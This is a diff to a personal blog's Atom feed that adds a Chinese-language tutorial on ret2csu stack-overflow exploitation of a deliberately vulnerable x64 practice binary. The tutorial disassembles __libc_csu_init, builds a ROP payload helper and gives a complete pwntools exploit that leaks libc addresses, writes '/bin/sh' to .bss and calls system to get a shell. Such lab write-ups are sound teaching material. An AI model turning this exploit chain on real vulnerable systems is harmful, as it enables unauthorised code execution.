@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://limpid94.github.io</id>
     <title>Limpid</title>
-    <updated>2021-08-22T16:57:34.300Z</updated>
+    <updated>2021-09-21T18:20:04.840Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://limpid94.github.io"/>
     <link rel="self" href="https://limpid94.github.io/atom.xml"/>
@@ -10,6 +10,166 @@
     <logo>https://limpid94.github.io/images/avatar.png</logo>
     <icon>https://limpid94.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Limpid</rights>
+    <entry>
+        <title type="html"><![CDATA[【PWN】Linux栈溢出——ret2csu]]></title>
+        <id>https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csu/</id>
+        <link href="https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csu/">
+        </link>
+        <updated>2021-09-20T17:21:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="调试过程">调试过程</h2>
+<h3 id="程序源码">程序源码</h3>
+<pre><code class="language-c">#undef _FORTIFY_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void vulnerable_function() {
+	char buf[128];
+	read(STDIN_FILENO, buf, 512);
+}
+
+int main(int argc, char** argv) {
+	write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
+	vulnerable_function();
+}
+</code></pre>
+<p>本程序可以看到代码一开始输出Hello, World之后进入有漏洞的函数中，在该函数中buf的大小为128，而读入的长度可以达到512，因此可能存在栈溢出漏洞</p>
+<h3 id="保护检查">保护检查</h3>
+<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1632159306393.PNG" alt="" loading="lazy"></figure>
+<h3 id="确定偏移">确定偏移</h3>
+<p>先生成300长度的padding用来确定offset值。由于x64架构下若地址大于0x00007fffffffffff时会抛出错误，但是在ret的时候RSP已经指向保存的返回地址。<br>
+<img src="https://limpid94.github.io/post-images/1632160350766.PNG" alt="" loading="lazy"><br>
+因此打印出RSP的值就可以得到offset的值。<br>
+经过测量之后长度为136个字符。</p>
+<h3 id="构造ropgadget">构造ROPGadget</h3>
+<p>X64架构的函数传参和X86还是很不一样的。前者会将函数的前6个参数放入6个不同的寄存器中。因此在构造gadget的时候需要分别找出操作 rdi, rsi, rdx, rcx, r8, r9的汇编指令。<br>
+本程序用ROPgadget找不出单纯对以上6个寄存器的操作指令，但是可以考虑从<code>__libc_csu_init</code>的汇编指令中初始化环境的时候对rdi, rsi, rdx, rcx, r8, r9的操作。</p>
+<pre><code>00000000004005a0 &lt;__libc_csu_init&gt;:
+  4005a0:	48 89 6c 24 d8       	mov    QWORD PTR [rsp-0x28],rbp
+  4005a5:	4c 89 64 24 e0       	mov    QWORD PTR [rsp-0x20],r12
+  4005aa:	48 8d 2d 73 08 20 00 	lea    rbp,[rip+0x200873]        # 600e24 &lt;__init_array_end&gt;
+  4005b1:	4c 8d 25 6c 08 20 00 	lea    r12,[rip+0x20086c]        # 600e24 &lt;__init_array_end&gt;
+  4005b8:	4c 89 6c 24 e8       	mov    QWORD PTR [rsp-0x18],r13
+  4005bd:	4c 89 74 24 f0       	mov    QWORD PTR [rsp-0x10],r14
+  4005c2:	4c 89 7c 24 f8       	mov    QWORD PTR [rsp-0x8],r15
+  4005c7:	48 89 5c 24 d0       	mov    QWORD PTR [rsp-0x30],rbx
+  4005cc:	48 83 ec 38          	sub    rsp,0x38
+  4005d0:	4c 29 e5             	sub    rbp,r12
+  4005d3:	41 89 fd             	mov    r13d,edi
+  4005d6:	49 89 f6             	mov    r14,rsi
+  4005d9:	48 c1 fd 03          	sar    rbp,0x3
+  4005dd:	49 89 d7             	mov    r15,rdx
+  4005e0:	e8 1b fe ff ff       	call   400400 &lt;_init&gt;
+  4005e5:	48 85 ed             	test   rbp,rbp
+  4005e8:	74 1c                	je     400606 &lt;__libc_csu_init+0x66&gt;
+  4005ea:	31 db                	xor    ebx,ebx
+  4005ec:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
+  4005f0:	4c 89 fa             	mov    rdx,r15
+  4005f3:	4c 89 f6             	mov    rsi,r14
+  4005f6:	44 89 ef             	mov    edi,r13d
+  4005f9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
+  4005fd:	48 83 c3 01          	add    rbx,0x1
+  400601:	48 39 eb             	cmp    rbx,rbp
+  400604:	75 ea                	jne    4005f0 &lt;__libc_csu_init+0x50&gt;
+  400606:	48 8b 5c 24 08       	mov    rbx,QWORD PTR [rsp+0x8]
+  40060b:	48 8b 6c 24 10       	mov    rbp,QWORD PTR [rsp+0x10]
+  400610:	4c 8b 64 24 18       	mov    r12,QWORD PTR [rsp+0x18]
+  400615:	4c 8b 6c 24 20       	mov    r13,QWORD PTR [rsp+0x20]
+  40061a:	4c 8b 74 24 28       	mov    r14,QWORD PTR [rsp+0x28]
+  40061f:	4c 8b 7c 24 30       	mov    r15,QWORD PTR [rsp+0x30]
+  400624:	48 83 c4 38          	add    rsp,0x38
+  400628:	c3                   	ret    
+  400629:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
+</code></pre>
+<p>从<code>0x400606</code>~<code>0x400628</code>这部分可以控制rbx、rbp、r12、r13、r14、r15寄存器；而<code>0x4005F0</code>~<code>0x400604</code>则可以将r13、r14、r15的值分别赋值给RDI,RSI,RDX。<br>
+syscall函数在传递参数的时候顺序如下<br>
+<img src="https://limpid94.github.io/post-images/1632234018536.PNG" alt="" loading="lazy"><br>
+因此将<code>0x400606</code><sub>`0x400628`作为Gadget的第一部分，然后跟上需要压入的数据，再用`0x4005F0`</sub><code>0x400604</code>作为第二部分，利用<code>0x4005f0</code>~<code>0x4005f9</code>来调用我们需要的函数，而传入的参数就是之前压入的数据。<br>
+当然，此处有几个值得关注的细节。首先为了能利用<code>0x4005f9</code>的调用，应该给rbx赋值为0，同时将需要调用的函数给r12，也就是先压入<code>[rsp+0x18]</code>的栈中。而执行完这条指令后rbx+1，会跟rbp相比较，若不相同则会跳转。为了控制其不进行跳转需要给rbp赋值为1。</p>
+<p>依据以上的分析，可以写出大致的payload</p>
+<pre><code class="language-python">def csu (rbx, rbp, r12, r13, r14, r15, ret_addr):
+    gadget1_addr = 0x400606
+    gadget2_addr = 0x4005f0
+    payload = b'A'*0x88 + p64(gadget1_addr) + p64(0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(gadget2_addr) + b'B'*0x38 + p64(ret_addr)
+    log.info('sending payload ....')
+    p.send(payload)
+</code></pre>
+<p>之后需要考虑如何获取函数的真实地址以及如何计算出libc中的system地址并在可用的地址写入<code>/bin/sh\x00</code><br>
+由于没有给出Libc地版本，此处使用LibcSearcher来进行查找</p>
+<pre><code class="language-python">libc = LibcSearcher('write',write_addr)
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1632247589196.PNG" alt="" loading="lazy"></figure>
+<p>具体的攻击流程 ：</p>
+<ul>
+<li>第一步：泄露read和write的真实地址并用其地址在LibcSearcher中进行查找libc的版本</li>
+<li>第二步：调用read函数往bss段写入system的真实地址和<code>/bin/sh\x00</code></li>
+<li>第三步：调用system函数并将<code>/bin/sh\x00</code>传入。</li>
+</ul>
+<h2 id="完整exp">完整EXP</h2>
+<pre><code class="language-python"># coding:utf-8
+
+from pwn import *
+from LibcSearcher import *
+
+# context.log_level = 'debug'
+p = process(&quot;./level5_1&quot;)
+elf = ELF(&quot;level5_1&quot;)
+
+write_got = elf.got['write']
+main_addr = elf.symbols['main']
+read_got = elf.got['read']
+bss_segm = elf.bss()
+log.info('main_addr: '+hex(main_addr))
+log.info('write_got: '+hex(write_got))
+log.info('bss_addr: '+hex(bss_segm))
+# raw_input('&gt;&gt;&gt;&gt;')
+
+def csu (rbx, rbp, r12, r13, r14, r15, ret_addr):
+    gadget1_addr = 0x400606
+    gadget2_addr = 0x4005f0
+    payload = b'A'*0x88 + p64(gadget1_addr) + p64(0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(gadget2_addr) + b'B'*0x38 + p64(ret_addr)
+    log.info('sending payload ....')
+    p.send(payload)
+    sleep(0.5)
+    
+
+# ROP 1 --&gt; try to 
+# payload = padding + gadget1_addr + rbx + rbp + r12 + 13 + r14 + r15
+# payload += gadget2_addr + padding(0x38) + ret_addr 
+log.info('Try to search libc version')
+p.recvuntil('d\n')
+
+csu(0, 1, write_got, 1, write_got, 8, main_addr)
+write_addr = u64(p.recv(8))
+p.recvuntil('d\n')
+csu(0, 1, write_got, 1, read_got, 8, main_addr)   
+read_addr = u64(p.recv(8))
+log.info('Write_addr: '+ hex(write_addr))
+log.info('read_addr: '+ hex(read_addr))
+libc = LibcSearcher('write',write_addr)
+libc.add_condition('read',read_addr) 
+libc_base = write_addr - libc.dump('write')
+system_addr = libc_base + libc.dump('system')
+log.info('libc_addr: '+hex(libc_base))
+log.info('system_addr: '+hex(system_addr))
+
+# ROP2 --&gt; try to write '/bin/sh' to bss segment
+log.info('Try to write \'/bin/sh\' to bss segment')
+p.recvuntil('d\n')
+csu(0, 1, read_got, 0, bss_segm, 16, main_addr)  
+p.send(p64(system_addr) + b'/bin/sh\x00')  #\x00\x00\x00\x00\x00\x00\x00\x00
+
+# ROP2 --&gt; try to getshell
+log.info('Try to get shell')
+p.recvuntil('d\n')
+csu(0, 1, bss_segm, bss_segm+8, 0, 0, 0xdeadbeef) 
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://limpid94.github.io/post-images/1632248303258.PNG" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[【Java-Web】某仿商城源码审计]]></title>
         <id>https://limpid94.github.io/post/java-web-mou-fang-shang-cheng-yuan-ma-shen-ji/</id>
